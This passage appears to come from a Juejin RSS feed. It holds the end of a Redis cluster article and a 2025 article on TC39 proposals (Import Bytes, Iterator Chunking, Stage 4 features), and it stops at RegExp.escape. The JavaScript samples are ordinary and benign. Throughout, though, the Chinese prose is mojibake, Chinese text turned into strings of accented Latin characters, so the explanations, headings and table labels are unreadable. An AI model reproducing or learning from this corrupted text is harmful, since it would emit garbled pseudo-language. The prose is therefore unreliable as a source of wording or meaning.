<li><strong>æŒç»­å­¦ä¹ æ–°ç‰¹æ€§</strong>ï¼šRedis 7.0å¼•å…¥äº†å¤šçº¿ç¨‹I/Oå’Œæ›´å¼ºçš„é›†ç¾¤ç®¡ç†åŠŸèƒ½ï¼Œå€¼å¾—å…³æ³¨å’Œå°è¯•ã€‚</li>
</ol>
<h3 data-id="heading-45">å±•æœ›</h3>
<p>Redisçš„æœªæ¥å‘å±•ä¸äº‘åŸç”Ÿå’Œåˆ†å¸ƒå¼ç³»ç»Ÿçš„è¶‹åŠ¿ç´§å¯†ç›¸è¿ã€‚éšç€å®¹å™¨åŒ–æŠ€æœ¯çš„æ™®åŠï¼ŒRedis Clusteråœ¨Kubernetesç­‰å¹³å°ä¸Šçš„éƒ¨ç½²å°†æ›´åŠ ä¾¿æ·ï¼Œè‡ªåŠ¨åŒ–è¿ç»´ä¹Ÿä¼šæˆä¸ºæ ‡é…ã€‚åŒæ—¶ï¼ŒRedisçš„æ¨¡å—åŒ–è®¾è®¡ï¼ˆå¦‚RedisJSONã€RedisGraphï¼‰è®©å®ƒä»å•çº¯çš„é”®å€¼å­˜å‚¨è¿›åŒ–æˆå¤šåŠŸèƒ½æ•°æ®å¹³å°ï¼Œåº”ç”¨åœºæ™¯å°†è¿›ä¸€æ­¥æ‹“å®½ã€‚<br/>
ä¸ªäººé¢„æµ‹ï¼Œæœªæ¥Rediså¯èƒ½ä¼šåœ¨è¾¹ç¼˜è®¡ç®—å’ŒAIæ¨ç†é¢†åŸŸå´­éœ²å¤´è§’ï¼Œæ¯”å¦‚é€šè¿‡å†…å­˜åŠ é€Ÿå®æ—¶æ¨¡å‹é¢„æµ‹ã€‚è¿™ä¸ä»…æ˜¯å¯¹æ€§èƒ½çš„æŒ‘æˆ˜ï¼Œä¹Ÿæ˜¯å¯¹åˆ†å¸ƒå¼æ¶æ„çš„æ–°è€ƒéªŒã€‚</p>
<h3 data-id="heading-46">ä¸ªäººå¿ƒå¾—</h3>
<p>ä½œä¸ºä¸€åRedisè€ç”¨æˆ·ï¼Œæˆ‘æœ€å¤§çš„æ„Ÿè§¦æ˜¯ï¼šæŠ€æœ¯æ²¡æœ‰é“¶å¼¹ï¼ŒRedisé›†ç¾¤è™½å¼ºå¤§ï¼Œä½†å¹¶éä¸‡èƒ½ã€‚å®ƒçš„æˆåŠŸåº”ç”¨ç¦»ä¸å¼€å¯¹ä¸šåŠ¡çš„æ·±åˆ»ç†è§£å’Œå¯¹ç»†èŠ‚çš„æè‡´è¿½æ±‚ã€‚æ¯æ¬¡è¸©å‘éƒ½æ˜¯ä¸€æ¬¡æˆé•¿ï¼Œæ¯”å¦‚çƒ­ç‚¹Keyçš„ä¼˜åŒ–è®©æˆ‘å­¦ä¼šäº†â€œåˆ†è€Œæ²»ä¹‹â€ï¼Œè€ŒAOFçš„æ•™è®­åˆ™æé†’æˆ‘â€œå®‰å…¨ç¬¬ä¸€â€ã€‚å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½ä¸ºä½ ç‚¹äº®ä¸€ç›ç¯ï¼Œæ— è®ºæ˜¯åˆæ¢é›†ç¾¤è¿˜æ˜¯ä¼˜åŒ–ç°æœ‰ç³»ç»Ÿï¼Œéƒ½èƒ½å°‘èµ°å¼¯è·¯ï¼Œå¤šäº›ä¿¡å¿ƒã€‚</p>
<hr/>
<h3 data-id="heading-47">æ€»ç»“è¡¨æ ¼ï¼šRedisæ¼”è¿›è·¯å¾„ä»·å€¼</h3>






























<table><thead><tr><th><strong>é˜¶æ®µ</strong></th><th><strong>æ ¸å¿ƒä»·å€¼</strong></th><th><strong>é€‚ç”¨åœºæ™¯</strong></th></tr></thead><tbody><tr><td>å•æœº</td><td>ç®€å•é«˜æ•ˆ</td><td>å°å‹åº”ç”¨</td></tr><tr><td>ä¸»ä»</td><td>è¯»å†™åˆ†ç¦»</td><td>ä¸­å‹è¯»å¤šå†™å°‘ç³»ç»Ÿ</td></tr><tr><td>å“¨å…µ</td><td>é«˜å¯ç”¨æ€§</td><td>å¯¹ä¸­æ–­æ•æ„Ÿçš„åº”ç”¨</td></tr><tr><td>é›†ç¾¤</td><td>åˆ†å¸ƒå¼æ‰©å±•</td><td>å¤§è§„æ¨¡é«˜å¹¶å‘ç³»ç»Ÿ</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 å¹´ TC39 éƒ½åœ¨å¿™ä»€ä¹ˆï¼ŸImport Bytesã€Iterator Chunking æ¥äº†]]></title>    <link>https://juejin.cn/post/7581306080435322931</link>    <guid>https://juejin.cn/post/7581306080435322931</guid>    <pubDate>2025-12-08T14:27:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581306080435322931" data-draft-id="7581359420391800859" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 å¹´ TC39 éƒ½åœ¨å¿™ä»€ä¹ˆï¼ŸImport Bytesã€Iterator Chunking æ¥äº†"/> <meta itemprop="keywords" content="JavaScript,å‰ç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-08T14:27:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 å¹´ TC39 éƒ½åœ¨å¿™ä»€ä¹ˆï¼ŸImport Bytesã€Iterator Chunking æ¥äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T14:27:59.000Z" title="Mon Dec 08 2025 14:27:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TC39 2025ï¼šImport Bytesã€Iterator Chunking å’Œé‚£äº›å³å°†è½åœ°çš„æ–°ç‰¹æ€§</h2>
<p>å†™è·¨å¹³å°çš„ JS ä»£ç æ—¶ï¼Œè¯»ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶éƒ½å¾—å†™ä¸‰å¥—é€»è¾‘ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æµè§ˆå™¨</span>
<span class="hljs-keyword">const</span> bytes = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'./photo.png'</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-title function_">arrayBuffer</span>());

<span class="hljs-comment">// Node.js</span>
<span class="hljs-keyword">const</span> bytes = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>).<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'./photo.png'</span>);

<span class="hljs-comment">// Deno</span>
<span class="hljs-keyword">const</span> bytes = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Deno</span>.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'./photo.png'</span>);
</code></pre>
<p>åŒæ ·çš„éœ€æ±‚ï¼Œä¸‰ç§å†™æ³•ã€‚æƒ³å†™ä¸ªåŒæ„çš„å›¾ç‰‡å¤„ç†åº“ï¼Ÿå…ˆæŠŠè¿™ä¸‰å¥— API é€‚é…ä¸€éå†è¯´ã€‚</p>
<p>å¥½æ¶ˆæ¯æ˜¯ï¼ŒTC39 åœ¨ 2025 å¹´æ¨è¿›äº†å¥½å‡ ä¸ªææ¡ˆæ¥è§£å†³è¿™ç±»é—®é¢˜ã€‚è¿™ç¯‡æ–‡ç« èŠèŠå…¶ä¸­æœ€å€¼å¾—å…³æ³¨çš„å‡ ä¸ªï¼šImport Bytesã€Iterator Chunkingï¼Œä»¥åŠä»Šå¹´å·²ç»è¿›å…¥ Stage 4 çš„æ–°ç‰¹æ€§ã€‚</p>
<h3 data-id="heading-1">Import Bytesï¼šä¸€è¡Œä»£ç æå®šäºŒè¿›åˆ¶å¯¼å…¥</h3>
<h4 data-id="heading-2">ç°åœ¨æ˜¯ä»€ä¹ˆçŠ¶æ€</h4>
<p><strong>Stage 2.7</strong>ï¼ˆæˆªè‡³ 2025 å¹´ 9 æœˆï¼‰ï¼Œç¦»æ­£å¼æ ‡å‡†å°±å·®ä¸´é—¨ä¸€è„šäº†ã€‚ææ¡ˆè´Ÿè´£äººæ˜¯ Steven Salatï¼ŒGuy Bedford æ˜¯å…±åŒä½œè€…ã€‚</p>
<h4 data-id="heading-3">æ ¸å¿ƒè¯­æ³•</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> bytes <span class="hljs-keyword">from</span> <span class="hljs-string">"./photo.png"</span> <span class="hljs-keyword">with</span> { <span class="hljs-attr">type</span>: <span class="hljs-string">"bytes"</span> };
<span class="hljs-comment">// bytes æ˜¯ Uint8Arrayï¼Œåº•å±‚æ˜¯ä¸å¯å˜çš„ ArrayBuffer</span>
</code></pre>
<p>åŠ¨æ€å¯¼å…¥ä¹Ÿæ”¯æŒï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> bytes = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">"./photo.png"</span>, { <span class="hljs-attr">with</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">"bytes"</span> } });
</code></pre>
<p>å°±è¿™ä¹ˆç®€å•ã€‚ä¸ç®¡ä½ åœ¨æµè§ˆå™¨ã€Node.js è¿˜æ˜¯ Denoï¼ŒåŒä¸€è¡Œä»£ç ï¼ŒåŒæ ·çš„ç»“æœã€‚</p>
<h4 data-id="heading-4">ä¸ºä»€ä¹ˆè¿”å› Uint8Array è€Œä¸æ˜¯ ArrayBuffer</h4>
<p>ææ¡ˆé€‰æ‹©è¿”å› <code>Uint8Array</code> è€Œä¸æ˜¯è£¸çš„ <code>ArrayBuffer</code>ï¼Œç†ç”±æŒºå®åœ¨çš„ï¼š</p>
<ol>
<li><strong>å°‘ä¸€æ­¥æ“ä½œ</strong> - æ‹¿åˆ° ArrayBuffer ä½ è¿˜å¾—è‡ªå·±åˆ›å»º TypedViewï¼ŒUint8Array ç›´æ¥å°±èƒ½ç”¨</li>
<li><strong>è·Ÿç°æœ‰ API ä¿æŒä¸€è‡´</strong> - <code>Response.bytes()</code> å’Œ <code>Blob.bytes()</code> éƒ½è¿”å› Uint8Array</li>
<li><strong>Node.js Buffer å…¼å®¹</strong> - Buffer æœ¬èº«å°±æ˜¯ Uint8Array çš„å­ç±»</li>
</ol>
<h4 data-id="heading-5">ä¸ºä»€ä¹ˆåº•å±‚æ˜¯ä¸å¯å˜çš„ ArrayBuffer</h4>
<p>è¿™ä¸ªè®¾è®¡å†³å®šæŒºæœ‰æ„æ€çš„ã€‚åº•å±‚ ArrayBuffer è¢«è®¾è®¡æˆä¸å¯å˜çš„ï¼ŒåŸå› æœ‰ä¸‰ï¼š</p>
<ol>
<li><strong>é¿å…å…±äº«å¯å˜çŠ¶æ€</strong> - å¤šä¸ªæ¨¡å—å¯¼å…¥åŒä¸€ä¸ªæ–‡ä»¶ï¼Œæ‹¿åˆ°çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡ã€‚å¦‚æœå¯å˜ï¼Œä¸€ä¸ªæ¨¡å—æ”¹äº†æ•°æ®ï¼Œå…¶ä»–æ¨¡å—å…¨å—å½±å“</li>
<li><strong>åµŒå…¥å¼åœºæ™¯</strong> - ä¸å¯å˜æ•°æ®å¯ä»¥ç›´æ¥æ”¾ ROM é‡Œ</li>
<li><strong>å®‰å…¨æ€§è€ƒè™‘</strong> - é˜²æ­¢æ¨¡å—é—´é€šè¿‡å…±äº« buffer å»ºç«‹éšè”½é€šä¿¡é€šé“</li>
</ol>
<h4 data-id="heading-6">å®é™…èƒ½å¹²ä»€ä¹ˆ</h4>
<p><strong>å›¾ç‰‡å¤„ç†</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> imageBytes <span class="hljs-keyword">from</span> <span class="hljs-string">"./logo.png"</span> <span class="hljs-keyword">with</span> { <span class="hljs-attr">type</span>: <span class="hljs-string">"bytes"</span> };
<span class="hljs-comment">// ç”¨ satori ä¹‹ç±»çš„åŒæ„åº“å¤„ç†</span>
<span class="hljs-title function_">processImage</span>(imageBytes);
</code></pre>
<p><strong>åŠ è½½å­—ä½“</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> fontBytes <span class="hljs-keyword">from</span> <span class="hljs-string">"./custom.woff"</span> <span class="hljs-keyword">with</span> { <span class="hljs-attr">type</span>: <span class="hljs-string">"bytes"</span> };
<span class="hljs-comment">// Canvas æˆ– PDF ç”Ÿæˆæ—¶ç”¨</span>
<span class="hljs-title function_">registerFont</span>(fontBytes);
</code></pre>
<p><strong>æœºå™¨å­¦ä¹ æ¨¡å‹</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> modelBytes <span class="hljs-keyword">from</span> <span class="hljs-string">"./model.bin"</span> <span class="hljs-keyword">with</span> { <span class="hljs-attr">type</span>: <span class="hljs-string">"bytes"</span> };
<span class="hljs-title function_">loadModel</span>(modelBytes);
</code></pre>
<h4 data-id="heading-7">å·¥å…·é“¾æ”¯æŒ</h4>
<p>å¥½æ¶ˆæ¯æ˜¯ï¼Œä¸»æµå·¥å…·å·²ç»åœ¨è·Ÿè¿›äº†ã€‚Deno 2.4ã€Bun 1.1.7 éƒ½æœ‰ç±»ä¼¼å®ç°ï¼ŒWebpackã€esbuildã€Parcel ä¹Ÿæ”¯æŒç±»ä¼¼çš„äºŒè¿›åˆ¶å¯¼å…¥æœºåˆ¶ã€‚ç­‰ææ¡ˆæ­£å¼è½åœ°ï¼Œç»Ÿä¸€è¯­æ³•åªæ˜¯æ—¶é—´é—®é¢˜ã€‚</p>
<h3 data-id="heading-8">Iterator Chunkingï¼šè¿­ä»£å™¨åˆ†å—ç»ˆäºæœ‰åŸç”Ÿæ–¹æ¡ˆäº†</h3>
<h4 data-id="heading-9">ç°åœ¨æ˜¯ä»€ä¹ˆçŠ¶æ€</h4>
<p><strong>Stage 2.7</strong>ï¼ˆæˆªè‡³ 2025 å¹´ 9 æœˆï¼‰ï¼Œç”± Michael Ficarra ä¸»å¯¼ã€‚</p>
<h4 data-id="heading-10">ä¸¤ä¸ªæ ¸å¿ƒæ–¹æ³•</h4>
<p><strong>chunks(size) - éé‡å åˆ†å—</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>].<span class="hljs-title function_">values</span>();
<span class="hljs-keyword">const</span> chunked = numbers.<span class="hljs-title function_">chunks</span>(<span class="hljs-number">3</span>);

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> chunk <span class="hljs-keyword">of</span> chunked) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(chunk);
}
<span class="hljs-comment">// [1, 2, 3]</span>
<span class="hljs-comment">// [4, 5, 6]</span>
<span class="hljs-comment">// [7]</span>
</code></pre>
<p><strong>windows(size) - æ»‘åŠ¨çª—å£</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>].<span class="hljs-title function_">values</span>();
<span class="hljs-keyword">const</span> windowed = numbers.<span class="hljs-title function_">windows</span>(<span class="hljs-number">2</span>);

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-variable language_">window</span> <span class="hljs-keyword">of</span> windowed) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">window</span>);
}
<span class="hljs-comment">// [1, 2]</span>
<span class="hljs-comment">// [2, 3]</span>
<span class="hljs-comment">// [3, 4]</span>
</code></pre>
<p>åŒºåˆ«å¾ˆç›´è§‚ï¼šchunks æ˜¯åˆ‡æˆä¸€å—ä¸€å—äº’ä¸é‡å ï¼Œwindows æ˜¯æ»‘åŠ¨çª—å£æ¯æ¬¡ç§»åŠ¨ä¸€æ ¼ã€‚</p>
<h4 data-id="heading-11">è§£å†³ä»€ä¹ˆé—®é¢˜</h4>
<p>ä»¥å‰æƒ³åšåˆ†å—æ“ä½œï¼Œè¦ä¹ˆè‡ªå·±å†™ï¼Œè¦ä¹ˆå¼•å…¥ lodashï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// lodash æ–¹æ¡ˆ</span>
<span class="hljs-keyword">import</span> chunk <span class="hljs-keyword">from</span> <span class="hljs-string">'lodash/chunk'</span>;
<span class="hljs-keyword">const</span> chunks = <span class="hljs-title function_">chunk</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>], <span class="hljs-number">2</span>);

<span class="hljs-comment">// åŸç”Ÿæ–¹æ¡ˆ</span>
<span class="hljs-keyword">const</span> chunks = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>].<span class="hljs-title function_">values</span>().<span class="hljs-title function_">chunks</span>(<span class="hljs-number">2</span>);
</code></pre>
<p>åŸç”Ÿæ–¹æ¡ˆçš„ä¼˜åŠ¿ï¼š</p>
<ul>
<li>ä¸ç”¨è£…ä¾èµ–</li>
<li>æƒ°æ€§æ±‚å€¼ï¼Œå†…å­˜å‹å¥½</li>
<li>è·Ÿæ•´ä¸ªè¿­ä»£å™¨ç”Ÿæ€æ— ç¼è¡”æ¥</li>
<li>æ”¯æŒå¼‚æ­¥è¿­ä»£å™¨</li>
</ul>
<h4 data-id="heading-12">å®é™…åœºæ™¯</h4>
<p><strong>æ‰¹é‡ API è¯·æ±‚</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">batchProcess</span>(<span class="hljs-params">items</span>) {
  <span class="hljs-keyword">const</span> batches = items.<span class="hljs-title function_">values</span>().<span class="hljs-title function_">chunks</span>(<span class="hljs-number">50</span>);

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> batch <span class="hljs-keyword">of</span> batches) {
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(batch.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> api.<span class="hljs-title function_">process</span>(item)));
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">1000</span>); <span class="hljs-comment">// é¿å…è§¦å‘é™æµ</span>
  }
}
</code></pre>
<p><strong>ç§»åŠ¨å¹³å‡è®¡ç®—</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">movingAverage</span>(<span class="hljs-params">numbers, windowSize</span>) {
  <span class="hljs-keyword">return</span> numbers
    .<span class="hljs-title function_">values</span>()
    .<span class="hljs-title function_">windows</span>(windowSize)
    .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">w</span> =&gt;</span> w.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b) / windowSize)
    .<span class="hljs-title function_">toArray</span>();
}

<span class="hljs-keyword">const</span> prices = [<span class="hljs-number">100</span>, <span class="hljs-number">102</span>, <span class="hljs-number">98</span>, <span class="hljs-number">105</span>, <span class="hljs-number">103</span>, <span class="hljs-number">107</span>];
<span class="hljs-keyword">const</span> ma3 = <span class="hljs-title function_">movingAverage</span>(prices, <span class="hljs-number">3</span>);
<span class="hljs-comment">// 3æ—¥ç§»åŠ¨å¹³å‡</span>
</code></pre>
<p><strong>N-gram ç”Ÿæˆ</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">generateNGrams</span>(<span class="hljs-params">text, n</span>) {
  <span class="hljs-keyword">const</span> words = text.<span class="hljs-title function_">split</span>(<span class="hljs-string">' '</span>);
  <span class="hljs-keyword">return</span> words.<span class="hljs-title function_">values</span>()
    .<span class="hljs-title function_">windows</span>(n)
    .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">w</span> =&gt;</span> w.<span class="hljs-title function_">join</span>(<span class="hljs-string">' '</span>))
    .<span class="hljs-title function_">toArray</span>();
}

<span class="hljs-keyword">const</span> bigrams = <span class="hljs-title function_">generateNGrams</span>(<span class="hljs-string">"The quick brown fox"</span>, <span class="hljs-number">2</span>);
<span class="hljs-comment">// ["The quick", "quick brown", "brown fox"]</span>
</code></pre>
<h4 data-id="heading-13">è¾¹ç•Œæƒ…å†µçš„è®¨è®º</h4>
<p>è¿™ä¸ªææ¡ˆåœ¨æ¨è¿›è¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸€ä¸ªæœ‰æ„æ€çš„é—®é¢˜ï¼š<strong>å¦‚æœè¿­ä»£å™¨å…ƒç´ å°‘äºçª—å£å¤§å°ï¼Œwindows() åº”è¯¥è¿”å›ä»€ä¹ˆï¼Ÿ</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> small = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>].<span class="hljs-title function_">values</span>();
<span class="hljs-keyword">const</span> result = small.<span class="hljs-title function_">windows</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// åªæœ‰2ä¸ªå…ƒç´ ï¼Œè¯·æ±‚3ä¸ªçš„çª—å£</span>

<span class="hljs-comment">// é€‰é¡¹1ï¼šä¸è¿”å›ä»»ä½•çª—å£</span>
<span class="hljs-comment">// é€‰é¡¹2ï¼šè¿”å› [1, 2] ä½œä¸ºä¸å®Œæ•´çª—å£</span>
</code></pre>
<p>å§”å‘˜ä¼šè®¨è®ºåè®¤ä¸ºä¸¤ç§åœºæ™¯éƒ½æœ‰åˆç†çš„ä½¿ç”¨éœ€æ±‚ï¼Œæ‰€ä»¥å†³å®šæŠŠ <code>windows()</code> æ‹†åˆ†æˆå¤šä¸ªæ–¹æ³•æ¥åˆ†åˆ«å¤„ç†è¿™ä¸¤ç§æƒ…å†µã€‚è¿™ä¹Ÿæ˜¯ææ¡ˆä» Stage 2 åˆ° Stage 2.7 èŠ±äº†ç‚¹æ—¶é—´çš„åŸå› ã€‚</p>
<h3 data-id="heading-14">2025 å¹´è¿›å…¥ Stage 4 çš„ç‰¹æ€§</h3>
<p>é™¤äº†ä¸Šé¢ä¸¤ä¸ªè¿˜åœ¨æ¨è¿›çš„ææ¡ˆï¼Œ2025 å¹´è¿˜æœ‰å¥½å‡ ä¸ªç‰¹æ€§å·²ç»æ­£å¼"æ¯•ä¸š"äº†ï¼š</p>
<h4 data-id="heading-15">RegExp.escapeï¼ˆ2 æœˆï¼‰</h4>
<p>å®‰å…¨è½¬ä¹‰æ­£åˆ™è¡¨è¾¾å¼å­—ç¬¦ä¸²ï¼Œé˜²æ­¢æ³¨å…¥ï¼š</p>
